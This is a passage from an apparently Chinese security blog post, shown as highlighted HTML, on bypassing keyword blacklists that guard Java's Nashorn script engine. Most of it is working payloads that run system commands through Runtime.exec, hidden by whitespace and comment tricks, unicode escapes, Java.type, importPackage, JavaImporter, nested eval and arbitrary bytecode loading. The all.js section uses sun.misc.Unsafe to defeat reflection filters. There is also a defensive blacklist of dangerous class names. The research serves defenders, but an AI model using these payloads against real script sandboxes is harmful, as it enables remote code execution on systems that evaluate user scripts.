Calculator\&quot;);&#125;;&quot;</span>;<br><span class="hljs-comment">// 空格截断</span><br>        String test=<span class="hljs-string">&quot;var a = mainOutput(); function mainOutput() &#123; var x=java.lang.  Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;;&quot;</span>;<br><br></code></pre></td></tr></table></figure><h3 id="0x04-编码与反射"><a href="#0x04-编码与反射" class="headerlink" title="0x04  编码与反射"></a>0x04  编码与反射</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">test53</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0052\u0075\u006E\u0074\u0069\u006D\u0065\u002E\u0067\u0065\u0074\u0052\u0075\u006E\u0074\u0069\u006D\u0065\u0028\u0029\u002E\u0065\u0078\u0065\u0063(\&quot;open -a Calculator\&quot;);&quot;</span>;<br><br><span class="hljs-type">String</span> <span class="hljs-variable">test55</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;var clazz = java.security.SecureClassLoader.class;\n&quot;</span> +<br>        <span class="hljs-string">&quot;        var method = clazz.getSuperclass().getDeclaredMethod(&#x27;defineClass&#x27;, &#x27;anything&#x27;.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n&quot;</span> +<br>        <span class="hljs-string">&quot;        method.setAccessible(true);\n&quot;</span> +<br>        <span class="hljs-string">&quot;        var classBytes = &#x27;&quot;</span>+b64byte+<span class="hljs-string">&quot;&#x27;;&quot;</span> +<br>        <span class="hljs-string">&quot;        var bytes = java.util.Base64.getDecoder().decode(classBytes);\n&quot;</span> +<br>        <span class="hljs-string">&quot;        var constructor = clazz.getDeclaredConstructor();\n&quot;</span> +<br>        <span class="hljs-string">&quot;        constructor.setAccessible(true);\n&quot;</span> +<br>        <span class="hljs-string">&quot;        var clz = method.invoke(constructor.newInstance(), bytes, 0 , bytes.length);\nprint(clz);&quot;</span> +<br>        <span class="hljs-string">&quot;        clz.newInstance();&quot;</span>;<br><br></code></pre></td></tr></table></figure><h3 id="0x05-特性绕过"><a href="#0x05-特性绕过" class="headerlink" title="0x05 特性绕过"></a>0x05 特性绕过</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-comment">//使用特有的Java对象的type()方法导入类，轻松绕过</span><br>        String test51=<span class="hljs-string">&quot;var JavaTest= Java.type(\&quot;java.lang\&quot;+\&quot;.Runtime\&quot;); var b =JavaTest.getRuntime(); b.exec(\&quot;open -a Calculator\&quot;);&quot;</span>;<br><span class="hljs-comment">//兼容Rhino功能，又有了两种新的绕过方式。</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">test52</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;load(\&quot;nashorn:mozilla_compat.js\&quot;); importPackage(java.lang); var x=Runtime.getRuntime(); x.exec(\&quot;open -a Calculator\&quot;);&quot;</span>;<br>        String test54=<span class="hljs-string">&quot;var importer =JavaImporter(java.lang); with(importer)&#123; var x=Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="0x06-unicode换行符"><a href="#0x06-unicode换行符" class="headerlink" title="0x06 unicode换行符"></a>0x06 unicode换行符</h3><p>既然Nashorn是一个解析引擎,那么他一定有词法分析器.(<strong>感叹编译原理没有白学</strong>)。于是我下载了源码，开始对源码进行分析。我在<code>jdk.nashorn.internal.parser</code>包下面发现了<code>Lexer</code>类。类中有几个函数是用来判断<code>js空格</code>和<code>js换行符</code> 的，其中主要的三个字符串如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LFCR</span>     <span class="hljs-operator">=</span> <span class="hljs-string">&quot;\n\r&quot;</span>; <span class="hljs-comment">// line feed and carriage return (ctrl-m) </span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">JAVASCRIPT_WHITESPACE_EOL</span> <span class="hljs-operator">=</span><br>    LFCR +<br>    <span class="hljs-string">&quot;\u2028&quot;</span> + <span class="hljs-comment">// line separator</span><br>    <span class="hljs-string">&quot;\u2029&quot;</span>   <span class="hljs-comment">// paragraph separator</span><br>    ;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">JAVASCRIPT_WHITESPACE</span> <span class="hljs-operator">=</span><br>    SPACETAB +<br>    JAVASCRIPT_WHITESPACE_EOL +<br>    <span class="hljs-string">&quot;\u000b&quot;</span> + <span class="hljs-comment">// tabulation line</span><br>    <span class="hljs-string">&quot;\u000c&quot;</span> + <span class="hljs-comment">// ff (ctrl-l)</span><br>    <span class="hljs-string">&quot;\u00a0&quot;</span> + <span class="hljs-comment">// Latin-1 space</span><br>    <span class="hljs-string">&quot;\u1680&quot;</span> + <span class="hljs-comment">// Ogham space mark</span><br>    <span class="hljs-string">&quot;\u180e&quot;</span> + <span class="hljs-comment">// separator, Mongolian vowel</span><br>    <span class="hljs-string">&quot;\u2000&quot;</span> + <span class="hljs-comment">// en quad</span><br>    <span class="hljs-string">&quot;\u2001&quot;</span> + <span class="hljs-comment">// em quad</span><br>    <span class="hljs-string">&quot;\u2002&quot;</span> + <span class="hljs-comment">// en space</span><br>    <span class="hljs-string">&quot;\u2003&quot;</span> + <span class="hljs-comment">// em space</span><br>    <span class="hljs-string">&quot;\u2004&quot;</span> + <span class="hljs-comment">// three-per-em space</span><br>    <span class="hljs-string">&quot;\u2005&quot;</span> + <span class="hljs-comment">// four-per-em space</span><br>    <span class="hljs-string">&quot;\u2006&quot;</span> + <span class="hljs-comment">// six-per-em space</span><br>    <span class="hljs-string">&quot;\u2007&quot;</span> + <span class="hljs-comment">// figure space</span><br>    <span class="hljs-string">&quot;\u2008&quot;</span> + <span class="hljs-comment">// punctuation space</span><br>    <span class="hljs-string">&quot;\u2009&quot;</span> + <span class="hljs-comment">// thin space</span><br>    <span class="hljs-string">&quot;\u200a&quot;</span> + <span class="hljs-comment">// hair space</span><br>    <span class="hljs-string">&quot;\u202f&quot;</span> + <span class="hljs-comment">// narrow no-break space</span><br>    <span class="hljs-string">&quot;\u205f&quot;</span> + <span class="hljs-comment">// medium mathematical space</span><br>    <span class="hljs-string">&quot;\u3000&quot;</span> + <span class="hljs-comment">// ideographic space</span><br>    <span class="hljs-string">&quot;\ufeff&quot;</span>   <span class="hljs-comment">// byte order mark</span><br>    ;<br></code></pre></td></tr></table></figure><p>很显然到这里我们已经获取了非常多的可以替换空格和换行符的unicode码。于是我就简单尝试了一下绕过。在尝试过程中发现部分也是可以被检测出来的，而另外一部分不起作用。<strong>我猜想是js和java的处理这些字符的逻辑不同导致的</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">String test62=<span class="hljs-string">&quot;var test = mainOutput(); function mainOutput() &#123; var x=java.\u2029lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;;&quot;</span>;<br><br></code></pre></td></tr></table></figure><p><code>skipComments</code>函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">skipComments</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// Save the current position.</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> position;<br><br>        <span class="hljs-keyword">if</span> (ch0 == <span class="hljs-string">&#x27;/&#x27;</span>) &#123;<br>            <span class="hljs-comment">// Is it a // comment.</span><br>            <span class="hljs-keyword">if</span> (ch1 == <span class="hljs-string">&#x27;/&#x27;</span>) &#123;<br>                <span class="hljs-comment">// Skip over //.</span><br>                skip(<span class="hljs-number">2</span>);<br>                <span class="hljs-comment">// Scan for EOL.</span><br>                <span class="hljs-keyword">while</span> (!atEOF() &amp;amp;&amp;amp; !isEOL(ch0)) &#123;<br>                    skip(<span class="hljs-number">1</span>);<br>                &#125;<br>                <span class="hljs-comment">// Did detect a comment.</span><br>                add(COMMENT, start);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch1 == <span class="hljs-string">&#x27;*&#x27;</span>) &#123;<br>                <span class="hljs-comment">// Skip over /*.</span><br>                skip(<span class="hljs-number">2</span>);<br>                <span class="hljs-comment">// Scan for */.</span><br>                <span class="hljs-keyword">while</span> (!atEOF() &amp;amp;&amp;amp; !(ch0 == <span class="hljs-string">&#x27;*&#x27;</span> &amp;amp;&amp;amp; ch1 == <span class="hljs-string">&#x27;/&#x27;</span>)) &#123;<br>                    <span class="hljs-comment">// If end of line handle else skip character.</span><br>                    <span class="hljs-keyword">if</span> (isEOL(ch0)) &#123;<br>                        skipEOL(<span class="hljs-literal">true</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        skip(<span class="hljs-number">1</span>);<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (atEOF()) &#123;<br>                    <span class="hljs-comment">// TODO - Report closing */ missing in parser.</span><br>                    add(ERROR, start);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">// Skip */.</span><br>                    skip(<span class="hljs-number">2</span>);<br>                &#125;<br><br>                <span class="hljs-comment">// Did detect a comment.</span><br>                add(COMMENT, start);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch0 == <span class="hljs-string">&#x27;#&#x27;</span>) &#123;<br>            <span class="hljs-keyword">assert</span> scripting;<br>            <span class="hljs-comment">// shell style comment</span><br>            <span class="hljs-comment">// Skip over #.</span><br>            skip(<span class="hljs-number">1</span>);<br>            <span class="hljs-comment">// Scan for EOL.</span><br>            <span class="hljs-keyword">while</span> (!atEOF() &amp;amp;&amp;amp; !isEOL(ch0)) &#123;<br>                skip(<span class="hljs-number">1</span>);<br>            &#125;<br>            <span class="hljs-comment">// Did detect a comment.</span><br>            add(COMMENT, start);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Not a comment.</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>从上面的代码可以看出来，当遇到以<code>/</code>开头的就会检测第二个是不是<code>/</code>如果是的话就回去找<code>EOF换行符</code>，而这些<code>//......EOF</code>之间的内容都会被当做注释绕过的。<br>那么当我们的代码是如下的样子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">String test61=<span class="hljs-string">&quot;var test = mainOutput(); function mainOutput() &#123; var x=java.lang.//\nRuntime.getRuntime().exec(\&quot;calc\&quot;);&#125;;&quot;</span>;<br><br>        String test61=<span class="hljs-string">&quot;var test = mainOutput(); function mainOutput() &#123; var x=java.lang./**/Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;;&quot;</span>;<br></code></pre></td></tr></table></figure><p>因为我们的正则不严谨，用于匹配的字符串为<code>var test = mainOutput(); function mainOutput() &#123; var x=java.lang.</code>而被解析后的代码为<code>var test = mainOutput(); function mainOutput() &#123; var x=java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;;</code> 成功绕过了我们的检测。<br>上面的代码还有一个关于<code>#</code>的注释，但是一直没有尝试成功，猜测可能跟<code>assert scripting</code>这行代码有关。</p><h3 id="0x07-修复"><a href="#0x07-修复" class="headerlink" title="0x07 修复"></a>0x07 修复</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">KeywordCheckUtils7</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Set&lt;String&gt; blacklist = Sets.newHashSet(<br>            <span class="hljs-comment">// Java 全限定类名</span><br>            <span class="hljs-string">&quot;java.io.File&quot;</span>, <span class="hljs-string">&quot;java.io.RandomAccessFile&quot;</span>, <span class="hljs-string">&quot;java.io.FileInputStream&quot;</span>, <span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span>,<br>            <span class="hljs-string">&quot;java.lang.Class&quot;</span>, <span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>, <span class="hljs-string">&quot;java.lang.Runtime&quot;</span>, <span class="hljs-string">&quot;java.lang.System&quot;</span>, <span class="hljs-string">&quot;System.getProperty&quot;</span>,<br>            <span class="hljs-string">&quot;java.lang.Thread&quot;</span>, <span class="hljs-string">&quot;java.lang.ThreadGroup&quot;</span>, <span class="hljs-string">&quot;java.lang.reflect.AccessibleObject&quot;</span>, <span class="hljs-string">&quot;java.net.InetAddress&quot;</span>,<br>            <span class="hljs-string">&quot;java.net.DatagramSocket&quot;</span>, <span class="hljs-string">&quot;java.net.DatagramSocket&quot;</span>, <span class="hljs-string">&quot;java.net.Socket&quot;</span>, <span class="hljs-string">&quot;java.net.ServerSocket&quot;</span>,<br>            <span class="hljs-string">&quot;java.net.MulticastSocket&quot;</span>, <span class="hljs-string">&quot;java.net.MulticastSocket&quot;</span>, <span class="hljs-string">&quot;java.net.URL&quot;</span>, <span class="hljs-string">&quot;java.net.HttpURLConnection&quot;</span>,<br>            <span class="hljs-string">&quot;java.security.AccessControlContext&quot;</span>, <span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>,<br>            <span class="hljs-comment">//反射关键字</span><br>            <span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-string">&quot;newinstance&quot;</span>,<br>            <span class="hljs-comment">// JavaScript 方法</span><br>            <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;new function&quot;</span>,<br>            <span class="hljs-comment">//引擎特性</span><br>            <span class="hljs-string">&quot;Java.type&quot;</span>,<span class="hljs-string">&quot;importPackage&quot;</span>,<span class="hljs-string">&quot;importClass&quot;</span>,<span class="hljs-string">&quot;JavaImporter&quot;</span><br>            );<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">KeywordCheckUtils7</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 空构造方法</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkInsecureKeyword</span><span class="hljs-params">(String code)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 去除注释</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">removeComment</span> <span class="hljs-operator">=</span> StringUtils.replacePattern(code, <span class="hljs-string">&quot;(?:/\\*(?:[^*]|(?:\\*+[^*/]))*\\*+/)|(?://.*[\n\r\u2029\u2028])&quot;</span>, <span class="hljs-string">&quot; &quot;</span>);<br>        <span class="hljs-comment">//去除特殊字符</span><br>        removeComment =StringUtils.replacePattern(removeComment,<span class="hljs-string">&quot;[\u2028\u2029\u00a0\u1680\u180e\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200a\u202f\u205f\u3000\ufeff]&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-comment">// 去除空格</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">removeWhitespace</span> <span class="hljs-operator">=</span> StringUtils.replacePattern(removeComment, <span class="hljs-string">&quot;\\s+&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-comment">// 多个空格替换为一个</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">oneWhiteSpace</span> <span class="hljs-operator">=</span> StringUtils.replacePattern(removeComment, <span class="hljs-string">&quot;\\s+&quot;</span>, <span class="hljs-string">&quot; &quot;</span>);<br>        System.out.println(removeWhitespace);<br>        System.out.println(oneWhiteSpace);<br>        Set&lt;String&gt; insecure = blacklist.stream().filter(s -&gt; StringUtils.containsIgnoreCase(removeWhitespace, s) ||<br>                StringUtils.containsIgnoreCase(oneWhiteSpace, s)).collect(Collectors.toSet());<br><br>        <span class="hljs-keyword">if</span> (!CollectionUtils.isEmpty(insecure)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;存在不安全的关键字:&quot;</span>+insecure);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;存在安全问题&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-type">ScriptEngineManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>(<span class="hljs-literal">null</span>);<br>            <span class="hljs-type">ScriptEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> manager.getEngineByName(<span class="hljs-string">&quot;js&quot;</span>);<br>            engine.eval(code);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x08-实验"><a href="#0x08-实验" class="headerlink" title="0x08 实验"></a>0x08 实验</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">h2client</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String b64byte=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// classloader</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">test55</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;var clazz = java.security.SecureClassLoader.class;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        var method = clazz.getSuperclass().getDeclaredMethod(&#x27;defineClass&#x27;, &#x27;anything&#x27;.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n&quot;</span> +<br>                <span class="hljs-string">&quot;        method.setAccessible(true);\n&quot;</span> +<br>                <span class="hljs-string">&quot;        var classBytes = &#x27;&quot;</span>+b64byte+<span class="hljs-string">&quot;&#x27;;&quot;</span> +<br>                <span class="hljs-string">&quot;        var bytes = java.util.Base64.getDecoder().decode(classBytes);\n&quot;</span> +<br>                <span class="hljs-string">&quot;        var constructor = clazz.getDeclaredConstructor();\n&quot;</span> +<br>                <span class="hljs-string">&quot;        constructor.setAccessible(true);\n&quot;</span> +<br>                <span class="hljs-string">&quot;        var clz = method.invoke(constructor.newInstance(), bytes, 0 , bytes.length);\nprint(clz);&quot;</span> +<br>                <span class="hljs-string">&quot;        clz.newInstance();&quot;</span>;<br><br>        <span class="hljs-comment">//使用特有的Java对象的type()方法导入类，轻松绕过</span><br>        String test51=<span class="hljs-string">&quot;var JavaTest= Java.type(\&quot;java.lang\&quot;+\&quot;.Runtime\&quot;); var b =JavaTest.getRuntime(); b.exec(\&quot;open -a Calculator\&quot;);&quot;</span>;<br><span class="hljs-comment">//兼容Rhino功能，又有了两种新的绕过方式。</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">test52</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;load(\&quot;nashorn:mozilla_compat.js\&quot;); importPackage(java.lang); var x=Runtime.getRuntime(); x.exec(\&quot;open -a Calculator\&quot;);&quot;</span>;<br>        String test54=<span class="hljs-string">&quot;var importer =JavaImporter(java.lang); with(importer)&#123; var x=Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">test53</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0052\u0075\u006E\u0074\u0069\u006D\u0065\u002E\u0067\u0065\u0074\u0052\u0075\u006E\u0074\u0069\u006D\u0065\u0028\u0029\u002E\u0065\u0078\u0065\u0063(\&quot;open -a Calculator\&quot;);&quot;</span>;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">taowa</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;var a = mainOutput(); function mainOutput() &#123; new javax.script.ScriptEngineManager().getEngineByName(\&quot;js\&quot;).eval(\&quot;var a = test(); function test() &#123; var x=java.lang.\&quot;+\&quot;Runtime.getRuntime().exec(\\\&quot;open -a Calculator\\\&quot;);&#125;;\&quot;); &#125;;&quot;</span>;<br><br>        String test=<span class="hljs-string">&quot;var a = mainOutput(); function mainOutput() &#123; var x=java.lang.  Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;;&quot;</span>;<br>        String test62=<span class="hljs-string">&quot;var test = mainOutput(); function mainOutput() &#123; var x=java.\u000blang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;;&quot;</span>;<br>        String test61=<span class="hljs-string">&quot;var test = mainOutput(); function mainOutput() &#123; var x=java.lang./Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;;&quot;</span>;<br><br><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.script.ScriptEngineManager().getEngineByName(<span class="hljs-string">&quot;js&quot;</span>).eval(test61);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="js加载任意字节码"><a href="#js加载任意字节码" class="headerlink" title="js加载任意字节码"></a>js加载任意字节码</h2><h3 id="all-js"><a href="#all-js" class="headerlink" title="all.js"></a>all.js</h3><p>适用范围：jdk6-14</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> theUnsafeMethod = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>).<span class="hljs-title function_">getDeclaredField</span>(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>theUnsafeMethod.<span class="hljs-title function_">setAccessible</span>(<span class="hljs-literal">true</span>);<br>unsafe = theUnsafeMethod.<span class="hljs-title function_">get</span>(<span class="hljs-literal">null</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bypass</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> reflectionClass = java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;jdk.internal.reflect.Reflection&quot;</span>);<br>    <span class="hljs-keyword">var</span> classBuffer = reflectionClass.<span class="hljs-title function_">getResourceAsStream</span>(<span class="hljs-string">&quot;Reflection.class&quot;</span>).<span class="hljs-title function_">readAllBytes</span>();<br>    <span class="hljs-keyword">var</span> reflectionAnonymousClass = unsafe.<span class="hljs-title function_">defineAnonymousClass</span>(reflectionClass, classBuffer, <span class="hljs-literal">null</span>);<br><br>    <span class="hljs-keyword">var</span> fieldFilterMapField = reflectionAnonymousClass.<span class="hljs-title function_">getDeclaredField</span>(<span class="hljs-string">&quot;fieldFilterMap&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (fieldFilterMapField.<span class="hljs-title function_">getType</span>().<span class="hljs-title function_">isAssignableFrom</span>(java.<span class="hljs-property">lang</span>.<span class="hljs-property">Class</span>.<span class="hljs-title function_">forName</span>(<span class="hljs-string">&quot;java.util.HashMap&quot;</span>))) &#123;<br>        unsafe.<span 